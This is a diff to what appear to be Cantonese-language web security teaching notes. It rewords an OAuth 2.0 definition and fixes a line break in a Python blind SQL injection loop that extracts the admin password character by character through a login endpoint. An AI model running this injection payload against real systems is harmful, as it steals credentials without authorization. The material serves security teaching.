@@ -145,7 +145,7 @@ db.users.findOne({ username: "admin", password: "123" })
 
 ### 3.9 OAuth 2.0 authorization code flow（授權碼流程）
 
-**一句定義**：OAuth 2.0 係一套「**委派認證**」協定 —— 應用程式（叫做 **relying party／client**）本身唔保管你密碼，而係把瀏覽器送去 **identity provider（身分提供者，IdP）** 登入，provider 驗證完之後，把瀏覽器**轉返**應用程式，並喺 URL 帶上一個短命嘅 **authorization code（授權碼）**，應用程式再喺後端（server-to-server）用呢個 code 向 provider 嘅 **token endpoint** 換取身分資料。
+**一句定義**：OAuth 2.0 係一套「**委派授權（delegated authorization）**」框架（⚠️ 教材外補充：OAuth 本身唔做使用者認證，認證層係喺佢之上嘅 OpenID Connect） —— 應用程式（叫做 **relying party／client**）本身唔保管你密碼，而係把瀏覽器送去 **identity provider（身分提供者，IdP）** 登入，provider 驗證完之後，把瀏覽器**轉返**應用程式，並喺 URL 帶上一個短命嘅 **authorization code（授權碼）**，應用程式再喺後端（server-to-server）用呢個 code 向 provider 嘅 **token endpoint** 換取身分資料。
 **生活化比喻**：好似去酒店代客泊車 —— 你（使用者）唔使交出車匙原配（密碼），你只係喺停車場（provider）登記，然後攞一張**一次性取車票（code）**，酒店職員（relying party）憑票去換車。
 **English**：In the OAuth authorization code flow the relying party redirects the browser to the provider, receives a short-lived code on a callback URL, and exchanges it server-to-server for identity information.
 
@@ -416,8 +416,7 @@ for pos in range(1, 20):
     found = False
     for c in chars:
         payload = (
-            f"admin' AND substr((SELECT password FROM users WHERE 
-username='admin'),"
+            f"admin' AND substr((SELECT password FROM users WHERE username='admin'),"
             f"{pos},1)='{c}' OR '1'='1"
         )
         r = requests.post(url, json={"username": payload, "password": "x"})
